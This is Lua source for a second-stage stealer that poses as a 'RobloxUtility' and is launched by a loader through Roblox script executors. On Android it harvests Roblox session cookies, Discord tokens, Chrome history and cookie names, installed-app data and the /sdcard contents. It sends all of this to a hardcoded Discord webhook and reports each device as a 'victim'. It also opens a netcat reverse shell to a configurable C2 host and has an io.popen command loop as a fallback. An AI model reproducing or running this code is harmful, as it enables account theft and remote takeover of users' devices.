-- RobloxUtility L2 (Android-first harvester)
-- Decoded and executed by the L1 loader.
-- Pure Lua, no external deps. Works in:
--   Delta (Android) - full capability including os.execute / socket
--   Solara (Windows) - file I/O + HTTP only (no shell, no DLL)
--
-- Edit WEBHOOK_URL and C2_HOST below, then re-run tools\obfuscate.py

-- =============================================================================
-- CONFIG
-- =============================================================================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1476791698041339997/tRLjlN11V6jBrSfHak-PcMTpty-sjHAPglOXl5Gs92UH0nCz0bukhQuuMmv0b_uNj6Pi"
local C2_HOST    = nil  -- e.g., "1.2.3.4" or "c2.example.com"; nil = disable reverse shell
local C2_PORT    = 4444

-- =============================================================================
-- UTILITIES
-- =============================================================================
local function file_exists(p)
    if isfile then return isfile(p) end
    local f = io.open(p, "rb")
    if f then f:close(); return true end
    return false
end

local function folder_exists(p)
    if isfolder then return isfolder(p) end
    local items = listfiles and listfiles(p)
    if items then return true end
    return false
end

local function read_text(p)
    local f = io.open(p, "r")
    if not f then return nil end
    local d = f:read("*a")
    f:close()
    return d
end

local function read_bytes(p)
    local f = io.open(p, "rb")
    if not f then return nil end
    local d = f:read("*a")
    f:close()
    return d
end

local function file_size(p)
    local f = io.open(p, "rb")
    if not f then return 0 end
    local sz = f:seek("end")
    f:close()
    return sz or 0
end

local function list_dir(p)
    if listfiles then
        local ok, items = pcall(listfiles, p)
        if ok and items then return items end
    end
    return nil
end

local function trim(s)
    return s:match("^%s*(.-)%s*$")
end

local function join_path(a, b)
    if a:sub(-1) == "/" then return a .. b end
    return a .. "/" .. b
end

-- Recursive file walker (with depth limit to avoid infinite loops)
local function walk(root, results, max_depth)
    results = results or {}
    max_depth = max_depth or 5
    if max_depth <= 0 then return results end
    local items = list_dir(root)
    if not items then return results end
    for _, name in ipairs(items) do
        if name ~= "." and name ~= ".." and name:sub(1, 1) ~= "." then
            local full = join_path(root, name)
            if folder_exists(full) then
                walk(full, results, max_depth - 1)
            else
                table.insert(results, full)
            end
        end
    end
    return results
end

-- =============================================================================
-- JSON ENCODER (minimal)
-- =============================================================================
local function json_escape(s)
    s = tostring(s)
    s = s:gsub("\\", "\\\\")
    s = s:gsub('"', '\\"')
    s = s:gsub("\n", "\\n")
    s = s:gsub("\r", "\\r")
    s = s:gsub("\t", "\\t")
    return s
end

local json_encode
json_encode = function(v)
    local t = type(v)
    if t == "nil" then return "null"
    elseif t == "boolean" then return v and "true" or "false"
    elseif t == "number" then return tostring(v)
    elseif t == "string" then return '"' .. json_escape(v) .. '"'
    elseif t == "table" then
        local is_array = true
        local n = 0
        for k in pairs(v) do
            n = n + 1
            if type(k) ~= "number" then is_array = false end
        end
        if n == 0 then return "{}" end
        local parts = {}
        if is_array then
            for i = 1, n do table.insert(parts, json_encode(v[i])) end
            return "[" .. table.concat(parts, ",") .. "]"
        else
            -- Sort keys for stable output
            local keys = {}
            for k in pairs(v) do table.insert(keys, k) end
            table.sort(keys, function(a, b) return tostring(a) < tostring(b) end)
            for _, k in ipairs(keys) do
                table.insert(parts, '"' .. json_escape(tostring(k)) .. '":' .. json_encode(v[k]))
            end
            return "{" .. table.concat(parts, ",") .. "}"
        end
    end
    return "null"
end

-- =============================================================================
-- HTTP POST
-- =============================================================================
local function http_post_json(url, body)
    -- Modern executor request API
    local req = request or http_request or httpRequest or (syn and syn.request)
    if req then
        local ok, resp = pcall(req, {
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = body
        })
        if ok and resp then
            if type(resp) == "table" and resp.StatusCode then
                return resp.StatusCode >= 200 and resp.StatusCode < 300
            end
            return true
        end
    end
    -- Fallback: game:HttpPost
    if game and game.HttpPost then
        local ok = pcall(game.HttpPost, game, url, body)
        return ok
    end
    return false
end

local function webhook(title, content, color)
    if not content or content == "" then return end
    if #content > 1900 then
        content = content:sub(1, 1900) .. "\n... (truncated)"
    end
    local payload = json_encode({
        username = "RobloxUtility",
        embeds = {{
            title = title,
            description = content,
            color = color or 0x00ff00
        }}
    })
    http_post_json(WEBHOOK_URL, payload)
end

-- =============================================================================
-- PLATFORM DETECTION
-- =============================================================================
local function detect_platform()
    local sep = (package and package.config or "/"):sub(1, 1)
    if sep == "\\" then return "windows" end
    if file_exists("/system/build.prop") then return "android" end
    if file_exists("/System/Library") then return "ios" end
    if file_exists("/etc/hostname") and not file_exists("/proc/version") then
        return "linux"
    end
    if file_exists("/proc/version") then return "linux" end
    return "unknown"
end

-- =============================================================================
-- ANDROID: SYSTEM METADATA
-- =============================================================================
local function android_metadata()
    local info = {}
    local build_prop = read_text("/system/build.prop")
    if build_prop then
        for line in build_prop:gmatch("[^\n]+") do
            local k, v = line:match("^([%w%.]+)%s*=%s*(.-)%s*$")
            if k then
                if k == "ro.build.version.release" then info.android_version = v end
                if k == "ro.build.version.sdk"     then info.android_sdk = v end
                if k == "ro.product.model"         then info.model = v end
                if k == "ro.product.manufacturer"  then info.manufacturer = v end
                if k == "ro.product.brand"         then info.brand = v end
                if k == "ro.build.fingerprint"     then info.fingerprint = v end
                if k == "ro.product.cpu.abi"       then info.cpu_abi = v end
                if k == "ro.debuggable"            then info.debuggable = (v == "1") end
            end
        end
    end
    if gethwid then info.hwid = gethwid() end
    if identifyexecutor then info.executor = identifyexecutor() end
    -- Username from /data/data path component
    info.data_root_exists = file_exists("/data/data")
    info.sdcard_exists    = file_exists("/sdcard") or file_exists("/storage/emulated/0")
    info.os_execute       = (os and os.execute) and true or false
    info.socket_available = (require and pcall(require, "socket")) and true or false
    info.io_popen         = (io and io.popen) and true or false
    return info
end

-- =============================================================================
-- ANDROID: ROBLOX APP DATA HARVEST
-- =============================================================================
local function harvest_roblox_android()
    local findings = {}
    local base = "/data/data/com.roblox.client"
    if not file_exists(base) then return findings end

    -- App data layout
    local subdirs = { "databases", "files", "shared_prefs", "cache", "code_cache" }
    for _, sub in ipairs(subdirs) do
        local dir = base .. "/" .. sub
        if folder_exists(dir) then
            local files = walk(dir, {}, 2)
            for _, f in ipairs(files) do
                local sz = file_size(f)
                table.insert(findings, {
                    src = "roblox_appdata",
                    sub = sub,
                    file = f,
                    size = sz
                })
                -- For small text files, search for cookie patterns
                if sz > 0 and sz < 5 * 1024 * 1024 then
                    local content = read_bytes(f)
                    if content then
                        -- Look for Roblox session tokens
                        for m in content:gmatch("(_|WARNING:.-_[%w%-_]+)") do
                            if #m > 50 and #m < 500 then
                                table.insert(findings, {
                                    src = "roblox_appdata",
                                    sub = sub,
                                    file = f,
                                    type = "cookie_candidate",
                                    value = m:sub(1, 200)
                                })
                            end
                        end
                        -- Look for specific Roblox cookie names
                        for m in content:gmatch("(RBXSessionTrackerV2|RBXIpAddr|RBXUtility[%w_]+|RBX[%]_]?[%w_]+)") do
                            table.insert(findings, {
                                src = "roblox_appdata",
                                sub = sub,
                                file = f,
                                type = "roblox_cookie_name",
                                name = m
                            })
                        end
                    end
                end
            end
        end
    end
    return findings
end

-- =============================================================================
-- ANDROID: DISCORD TOKEN HARVEST
-- =============================================================================
local function harvest_discord_android()
    local findings = {}
    local base = "/data/data/com.discord"
    if not file_exists(base) then return findings end

    -- Discord mobile stores tokens in LevelDB or app webdata
    local files = walk(base, {}, 4)
    for _, f in ipairs(files) do
        local low = f:lower()
        if low:match("%.ldb$") or low:match("%.log$") or low:match("%.sqlite$") or low:match("local%.sqlite$") then
            local sz = file_size(f)
            if sz > 100 and sz < 50 * 1024 * 1024 then
                local content = read_bytes(f)
                if content then
                    -- Discord token pattern: base64.base64.base64 with proper lengths
                    -- Modern tokens: 4 parts separated by dots, each part base64url
                    for m in content:gmatch("([%w%-_]{20,30}%.[%w%-_]{6}%.[%w%-_]{27,40})") do
                        if #m >= 50 and #m <= 200 then
                            table.insert(findings, {
                                src = "discord_mobile",
                                file = f,
                                type = "token",
                                token = m
                            })
                        end
                    end
                end
            end
        end
    end
    return findings
end

-- =============================================================================
-- ANDROID: CHROME / SYSTEM BROWSER HARVEST
-- =============================================================================
local function harvest_chrome_android()
    local findings = {}
    local candidates = {
        "/data/data/com.android.chrome/app_chrome/Default",
        "/data/data/com.android.chrome/app_chrome/Profile 1",
        "/data/data/org.bromite.app/app_chrome/Default",
        "/data/data/com.brave.browser/app_chrome/Default",
    }

    for _, profile in ipairs(candidates) do
        if folder_exists(profile) then

        -- History file (SQLite, but we can grep for URLs)
        local history = profile .. "/History"
        if file_exists(history) then
            local content = read_bytes(history)
            if content and #content < 100 * 1024 * 1024 then
                local urls = {}
                for m in content:gmatch("(https?://[%w%-_%.%?&=:/%%#@!~%*%+;]+)") do
                    if not urls[m] and #m < 200 then
                        urls[m] = true
                        if #urls > 200 then break end
                    end
                end
                local ulist = {}
                for u in pairs(urls) do table.insert(ulist, u) end
                if #ulist > 0 then
                    -- Look for Roblox-related URLs
                    local roblox_urls = {}
                    for _, u in ipairs(ulist) do
                        if u:lower():match("roblox") or u:lower():match("discord") or u:lower():match("webhook") then
                            table.insert(roblox_urls, u)
                        end
                    end
                    table.insert(findings, {
                        src = "chrome_android",
                        file = history,
                        type = "history",
                        total = #ulist,
                        roblox_discord_urls = #roblox_urls,
                        sample = table.concat(roblox_urls:sub(1, 5), "\n")
                    })
                end
            end
        end

        -- Cookies (v10 plaintext, v20+ encrypted - we extract names/metadata)
        local cookies = profile .. "/Cookies"
        if file_exists(cookies) then
            local content = read_bytes(cookies)
            if content and #content < 50 * 1024 * 1024 then
                local names = {}
                for m in content:gmatch("([%w_%.%-]+)") do
                    if #m > 4 and #m < 60 and (m:match("roblox") or m:match("RBX") or m:match("_|WARNING:")) then
                        if not names[m] then
                            names[m] = true
                            if #names > 50 then break end
                        end
                    end
                end
                local nlist = {}
                for n in pairs(names) do table.insert(nlist, n) end
                if #nlist > 0 then
                    table.insert(findings, {
                        src = "chrome_android",
                        file = cookies,
                        type = "roblox_cookies_metadata",
                        names = table.concat(nlist, ", ")
                    })
                end
            end
        end
    end
    end
    return findings
end

-- =============================================================================
-- ANDROID: OTHER INTERESTING APPS
-- =============================================================================
local function harvest_other_apps_android()
    local findings = {}
    local interesting = {
        "com.discord",
        "com.whatsapp",
        "org.telegram.messenger",
        "com.snapchat.android",
        "com.instagram.android",
        "com.twitter.android",
        "com.facebook.katana",
        "com.spotify.music",
        "com.netflix.mediaclient",
        "com.paypal.android.p2pmobile",
        "com.venmo",
        "com.roblox.client",
        "com.mojang.minecraftpe",
        "com.epicgames.fortnite",
        "com.discord",
        "com.google.android.apps.maps",
        "com.microsoft.office.outlook",
        "com.amazon.mShop.android.shopping",
        "com.nianticlabs.pokemongo",
        "com.supercell.clashofclans",
    }
    for _, pkg in ipairs(interesting) do
        local path = "/data/data/" .. pkg
        local d, l, f = folder_exists(path), file_exists(path .. "/databases"), file_exists(path .. "/files")
        if d then
            table.insert(findings, {
                src = "installed_apps",
                pkg = pkg,
                has_databases = l,
                has_files = f
            })
        end
    end
    return findings
end

-- =============================================================================
-- ANDROID: /sdcard ENUMERATION
-- =============================================================================
local function harvest_sdcard_android()
    local findings = {}
    local sd = file_exists("/sdcard") and "/sdcard" or (file_exists("/storage/emulated/0") and "/storage/emulated/0")
    if not sd then return findings end
    local items = list_dir(sd)
    if items then
        local sorted = {}
        for _, i in ipairs(items) do
            if i:sub(1, 1) ~= "." then table.insert(sorted, i) end
        end
        table.insert(sorted, "(no DCIM): " .. tostring(not folder_exists(sd .. "/DCIM")))
        if #sorted > 0 then
            table.insert(findings, {
                src = "sdcard",
                path = sd,
                top_level = table.concat(sorted, ", ")
            })
        end
    end
    return findings
end

-- =============================================================================
-- WINDOWS HARVEST (fallback - DLL not active)
-- =============================================================================
local function harvest_windows()
    return {{
        src = "windows",
        status = "active harvest disabled (no JitInjector running)",
        note = "use JitInjector + utility.dll for full windows harvest",
    }}
end

-- =============================================================================
-- HARVEST ORCHESTRATOR
-- =============================================================================
local function run_harvest(platform)
    if platform == "android" then
        local all = {}
        local function add(t) for _, x in ipairs(t) do table.insert(all, x) end end
        add(harvest_roblox_android())
        add(harvest_discord_android())
        add(harvest_chrome_android())
        add(harvest_other_apps_android())
        add(harvest_sdcard_android())
        return all
    elseif platform == "windows" then
        return harvest_windows()
    end
    return {}
end

-- =============================================================================
-- REVERSE SHELL (Android only, if C2_HOST is set and shell access exists)
-- =============================================================================
local function try_reverse_shell()
    if not C2_HOST then
        webhook("C2", "Reverse shell not configured (C2_HOST is nil)", 0x808080)
        return
    end

    local socket_ok = pcall(require, "socket")
    if not socket_ok then
        webhook("C2", "Socket library not available, skipping reverse shell", 0xffaa00)
        return
    end

    local socket = require("socket")
    if not socket or not socket.tcp then
        webhook("C2", "Socket.tcp not exposed, skipping", 0xffaa00)
        return
    end

    webhook("C2", "Connecting to " .. C2_HOST .. ":" .. C2_PORT, 0x00aaff)

    local tcp = socket.tcp()
    tcp:settimeout(10)
    local ok, err = tcp:connect(C2_HOST, C2_PORT)
    if not ok then
        webhook("C2", "Connect failed: " .. tostring(err), 0xff0000)
        return
    end

    webhook("C2", "Connected. Forwarding via /system/bin/sh", 0x00ff00)

    -- If os.execute available, spawn reverse shell via netcat
    if os and os.execute then
        os.execute(string.format("/system/bin/sh -c '/system/bin/nc %s %d -e /system/bin/sh &'", C2_HOST, C2_PORT))
        return
    end

    -- Fallback: manual shell loop with io.popen
    if io and io.popen then
        tcp:send("SHELL_READY\n")
        spawn(function()
            while true do
                local line, err = tcp:receive("*l")
                if not line then break end
                local p = io.popen("/system/bin/sh -c " .. string.format("%q", line) .. " 2>&1")
                if p then
                    local out = p:read("*a") or ""
                    p:close()
                    tcp:send(out .. "\n")
                end
            end
        end)
    else
        tcp:send("Connected but io.popen not available - shell forwarding limited\n")
        tcp:close()
    end
end

-- =============================================================================
-- MAIN
-- =============================================================================
print("[+] RobloxUtility chain fired")

local platform = detect_platform()
print("[+] Platform: " .. platform)

-- Send "victim online" header
webhook(
    "Victim online (" .. platform .. ")",
    "HWID: " .. (gethwid and gethwid() or "?") ..
    "\nExecutor: " .. (identifyexecutor and identifyexecutor() or "?") ..
    "\nos.execute: " .. tostring(os and os.execute ~= nil) ..
    "\nsocket: " .. tostring(pcall(require, "socket")) ..
    "\nio.popen: " .. tostring(io and io.popen ~= nil),
    0x00ff00
)

if platform == "android" then
    -- Send detailed metadata
    local meta = android_metadata()
    webhook("Android metadata", json_encode(meta), 0x8080ff)
end

-- Run harvest
print("[*] Running harvest...")
local findings = run_harvest(platform)
print("[+] Findings: " .. #findings)

-- Send findings in chunks (Discord embed limit ~2000 chars)
local chunk = ""
local chunk_idx = 0
for i, f in ipairs(findings) do
    local line = "[" .. tostring(i) .. "] " .. json_encode(f)
    if #line > 1500 then line = line:sub(1, 1500) .. "..." end
    if #chunk + #line + 1 > 1800 then
        chunk_idx = chunk_idx + 1
        webhook("Findings " .. chunk_idx, chunk, 0x00aaff)
        chunk = ""
    end
    chunk = chunk .. (chunk ~= "" and "\n" or "") .. line
end
if chunk ~= "" then
    chunk_idx = chunk_idx + 1
    webhook("Findings " .. chunk_idx, chunk, 0x00aaff)
end

-- Try reverse shell
print("[*] Attempting reverse shell...")
try_reverse_shell()

print("[+] Done")
